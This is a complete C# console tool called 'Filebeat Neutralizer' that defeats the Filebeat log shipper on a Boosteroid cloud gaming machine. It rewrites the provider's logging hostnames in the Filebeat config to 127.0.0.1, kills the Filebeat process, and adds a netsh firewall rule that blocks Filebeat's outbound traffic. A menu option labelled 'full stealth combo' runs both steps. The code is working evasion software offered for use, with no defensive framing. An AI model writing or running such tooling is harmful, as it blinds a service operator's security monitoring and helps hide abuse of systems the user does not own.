using System;
using System.Diagnostics;
using System.IO;
using System.ServiceProcess;
using System.Text;
using System.Threading;

class FilebeatNeutralizer
{
    static string LOG = "";
    static string FILEBEAT_PATH = "C:\\Users\\user\\boosteroid-experience\\misc\\fb\\filebeat.exe";
    static string FILEBEAT_CONFIG = "C:\\Users\\user\\boosteroid-experience\\misc\\fb\\filebeat.yml";
    static string STORAGE = "S:\\";
    
    static void Main()
    {
        try
        {
            LOG = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "neutralizer.txt");
            
            File.WriteAllText(LOG, "=== FILEBEAT NEUTRALIZER ===\r\n");
            File.AppendAllText(LOG, "Time: " + DateTime.Now.ToString() + "\r\n\r\n");
            
            Console.Title = "Filebeat Neutralizer";
            Console.WriteLine(@"
╔════════════════════════════════════╗
║   FILEBEAT NEUTRALIZER v2.0       ║
╚════════════════════════════════════╝

[1] Scan filebeat config
[2] Redirect logs to localhost
[3] Block network via firewall  
[4] Full stealth combo (2+3)
[5] Exit

Choice: ");
            
            char choice = Console.ReadKey().KeyChar;
            Console.WriteLine("\n");
            
            if (choice == '1')
            {
                ScanFilebeat();
            }
            else if (choice == '2')
            {
                RedirectFilebeat();
            }
            else if (choice == '3')
            {
                BlockNetwork();
            }
            else if (choice == '4')
            {
                FullCombo();
            }
            else
            {
                Console.WriteLine("[!] Exiting...");
                return;
            }
            
            Console.WriteLine("\n[+] Done! Log: " + LOG);
            Console.WriteLine("\nPress ANY KEY to exit...");
            Console.ReadKey();
        }
        catch (Exception ex)
        {
            Console.WriteLine("ERROR: " + ex.Message);
            Log("ERROR: " + ex.ToString());
            Console.ReadKey();
        }
    }
    
    static void ScanFilebeat()
    {
        Console.WriteLine("[*] Scanning filebeat...\n");
        Log("[SCAN FILEBEAT]");
        
        // 1. Verificar processo
        try
        {
            Process[] procs = Process.GetProcessesByName("filebeat");
            if (procs.Length > 0)
            {
                Console.WriteLine("  [+] Process: RUNNING (PID " + procs[0].Id.ToString() + ")");
                Log("Process: RUNNING (PID " + procs[0].Id.ToString() + ")");
                
                try
                {
                    Console.WriteLine("  [+] Path: " + procs[0].MainModule.FileName);
                    Log("Path: " + procs[0].MainModule.FileName);
                }
                catch { }
            }
            else
            {
                Console.WriteLine("  [!] Process: NOT RUNNING");
                Log("Process: NOT RUNNING");
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("  [!] Process check failed: " + ex.Message);
        }
        
        // 2. Verificar serviço
        try
        {
            ServiceController sc = new ServiceController("filebeat");
            Console.WriteLine("  [+] Service: " + sc.Status.ToString());
            Log("Service: " + sc.Status.ToString());
        }
        catch
        {
            Console.WriteLine("  [!] Service: NOT FOUND (running as process)");
            Log("Service: NOT FOUND");
        }
        
        // 3. Ler config
        Console.WriteLine("\n  [*] Reading config...");
        Log("\n[CONFIG FILE]");
        
        if (File.Exists(FILEBEAT_CONFIG))
        {
            Console.WriteLine("  [+] Config found: " + FILEBEAT_CONFIG);
            Log("Config: " + FILEBEAT_CONFIG);
            
            try
            {
                string[] lines = File.ReadAllLines(FILEBEAT_CONFIG);
                
                Console.WriteLine("\n  --- Config Preview ---");
                int max = Math.Min(30, lines.Length);
                for (int i = 0; i < max; i++)
                {
                    Console.WriteLine("  " + lines[i]);
                    Log(lines[i]);
                }
                Console.WriteLine("  --- End (showing " + max.ToString() + " of " + lines.Length.ToString() + " lines) ---");
            }
            catch (Exception ex)
            {
                Console.WriteLine("  [!] Cannot read config: " + ex.Message);
                Log("Cannot read: " + ex.Message);
            }
        }
        else
        {
            Console.WriteLine("  [!] Config NOT FOUND");
            Log("Config: NOT FOUND");
        }
    }
    
    static void RedirectFilebeat()
    {
        Console.WriteLine("[*] Redirecting filebeat...\n");
        Log("\n[REDIRECT FILEBEAT]");
        
        if (!File.Exists(FILEBEAT_CONFIG))
        {
            Console.WriteLine("  [!] Config not found!");
            Log("FAILED: Config not found");
            return;
        }
        
        try
        {
            // Backup
            string backup = FILEBEAT_CONFIG + ".bak";
            File.Copy(FILEBEAT_CONFIG, backup, true);
            Console.WriteLine("  [+] Backup created: " + backup);
            Log("Backup: " + backup);
            
            // Ler config
            string config = File.ReadAllText(FILEBEAT_CONFIG);
            
            // Procurar outputs
            string[] servers = new string[] {
                "elastic.boosteroid.com",
                "logstash.boosteroid.com", 
                "logs.boosteroid.com",
                "boosteroid.com"
            };
            
            int replaced = 0;
            foreach (string server in servers)
            {
                if (config.Contains(server))
                {
                    config = config.Replace(server, "127.0.0.1");
                    Console.WriteLine("  [+] Redirected: " + server + " -> 127.0.0.1");
                    Log("Redirected: " + server);
                    replaced++;
                }
            }
            
            if (replaced > 0)
            {
                // Salvar
                File.WriteAllText(FILEBEAT_CONFIG, config);
                Console.WriteLine("\n  [+] Config modified (" + replaced.ToString() + " changes)");
                Log("Config modified: " + replaced.ToString() + " changes");
                
                // Matar processo pra recarregar
                Console.WriteLine("  [*] Restarting filebeat...");
                KillFilebeat();
                Thread.Sleep(2000);
                
                Console.WriteLine("  [+] Filebeat will restart automatically");
                Console.WriteLine("  [!] Logs now go to localhost (nowhere)!");
                Log("SUCCESS: Filebeat redirected");
            }
            else
            {
                Console.WriteLine("  [!] No servers found in config");
                Log("WARNING: No servers found");
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("  [!] Failed: " + ex.Message);
            Log("FAILED: " + ex.Message);
        }
    }
    
    static void BlockNetwork()
    {
        Console.WriteLine("[*] Blocking filebeat network...\n");
        Log("\n[BLOCK NETWORK]");
        
        try
        {
            // Remover regra antiga (se existir)
            RunCommand("netsh advfirewall firewall delete rule name=\"Block Filebeat\"");
            
            // Bloquear saída
            string cmd = "netsh advfirewall firewall add rule name=\"Block Filebeat\" dir=out action=block program=\"" + FILEBEAT_PATH + "\" enable=yes";
            RunCommand(cmd);
            
            Console.WriteLine("  [+] Firewall rule created");
            Log("Firewall: Rule created");
            
            Console.WriteLine("  [!] Filebeat network BLOCKED!");
            Log("SUCCESS: Network blocked");
        }
        catch (Exception ex)
        {
            Console.WriteLine("  [!] Failed: " + ex.Message);
            Log("FAILED: " + ex.Message);
        }
    }
    
    static void FullCombo()
    {
        Console.WriteLine("[*] Executing FULL STEALTH COMBO...\n");
        Log("\n[FULL COMBO]");
        
        RedirectFilebeat();
        Console.WriteLine("");
        BlockNetwork();
        
        Console.WriteLine("\n[+] FULL STEALTH ACTIVE!");
        Log("SUCCESS: Full combo complete");
    }
    
    static void KillFilebeat()
    {
        try
        {
            Process[] procs = Process.GetProcessesByName("filebeat");
            foreach (Process proc in procs)
            {
                proc.Kill();
            }
        }
        catch { }
    }
    
    static void RunCommand(string cmd)
    {
        try
        {
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "cmd.exe";
            psi.Arguments = "/c " + cmd;
            psi.CreateNoWindow = true;
            psi.UseShellExecute = false;
            
            Process proc = Process.Start(psi);
            if (proc != null)
            {
                proc.WaitForExit();
            }
        }
        catch { }
    }
    
    static void Log(string msg)
    {
        try
        {
            File.AppendAllText(LOG, msg + "\r\n");
        }
        catch { }
    }
}